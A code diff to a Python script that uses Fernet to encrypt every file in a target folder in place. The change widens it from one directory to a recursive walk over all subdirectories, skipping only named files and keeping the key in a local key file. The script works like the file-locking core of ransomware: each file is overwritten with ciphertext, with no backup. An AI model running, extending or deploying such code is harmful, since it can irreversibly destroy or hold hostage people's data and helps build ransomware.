@@ -17,32 +17,37 @@ def load_or_generate_key(key_file):
             f.write(key)
     return key
 
-# === Encrypt All Files Except Skipped Ones ===
+# === Encrypt All Files Except Skipped Ones (Recursive) ===
 def encrypt_files(folder_path, fernet):
-    for filename in os.listdir(folder_path):
-        if filename in SKIP_FILES:
-            continue
+    for root, _, files in os.walk(folder_path):
+        for filename in files:
+            if filename in SKIP_FILES:
+                print(f"[i] Skipped: {os.path.join(root, filename)}")
+                continue
 
-        file_path = os.path.join(folder_path, filename)
+            file_path = os.path.join(root, filename)
 
-        if os.path.isfile(file_path):
-            try:
-                with open(file_path, "rb") as file:
-                    data = file.read()
+            if os.path.isfile(file_path):
+                try:
+                    with open(file_path, "rb") as file:
+                        data = file.read()
 
-                encrypted_data = fernet.encrypt(data)
+                    encrypted_data = fernet.encrypt(data)
 
-                with open(file_path, "wb") as file:
-                    file.write(encrypted_data)
+                    with open(file_path, "wb") as file:
+                        file.write(encrypted_data)
 
-                print(f"[+] Encrypted: {filename}")
-            except Exception as e:
-                print(f"[!] Failed to encrypt {filename}: {e}")
+                    print(f"[+] Encrypted: {file_path}")
+                except Exception as e:
+                    print(f"[!] Failed to encrypt {file_path}: {e}")
 
 # === MAIN ===
 if __name__ == "__main__":
-    key = load_or_generate_key(KEY_FILE)
-    fernet = Fernet(key)
+    try:
+        key = load_or_generate_key(KEY_FILE)
+        fernet = Fernet(key)
 
-    encrypt_files(FOLDER_PATH, fernet)
-    print("\n✅ Encryption complete. All files encrypted (except skipped ones).")
+        encrypt_files(FOLDER_PATH, fernet)
+        print("\n✅ Encryption complete. All files encrypted (except skipped ones).")
+    except Exception as err:
+        print(f"[X] Error: {err}")
